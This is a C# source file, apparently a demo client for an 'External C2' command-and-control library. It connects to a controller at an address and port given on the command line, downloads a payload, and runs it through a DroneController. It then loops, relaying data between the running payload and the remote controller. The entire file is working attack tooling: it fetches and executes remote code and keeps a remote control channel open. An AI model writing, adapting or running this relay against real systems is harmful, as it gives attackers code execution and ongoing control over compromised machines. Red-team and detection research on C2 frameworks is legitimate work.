using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

using ExternalC2.Net.Client;

namespace DemoClient;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("demo-client.exe <address> <port>");
            return;
        }
        
        var target = IPAddress.Parse(args[0]);
        var port = int.Parse(args[1]);

        // connect to controller
        var controller = new TcpClient();
        await controller.ConnectAsync(target, port);
        
        // read payload
        var payload = await controller.ReadData();

        // create drone controller
        var drone = new DroneController();

        // event is fired whenever the drone sends outbound data
        drone.OnDataFromDrone += async delegate(byte[] bytes)
        {
            // send to controller
            await controller.WriteData(bytes);
        };
        
        drone.ExecutePayload(payload);

        // drop into loop
        while (controller.Connected)
        {
            if (controller.DataAvailable())
            {
                // read from controller
                var downstream = await controller.ReadData();
                
                // send it to the drone
                drone.SendDrone(downstream);
            }

            await Task.Delay(100);
        }
    }
}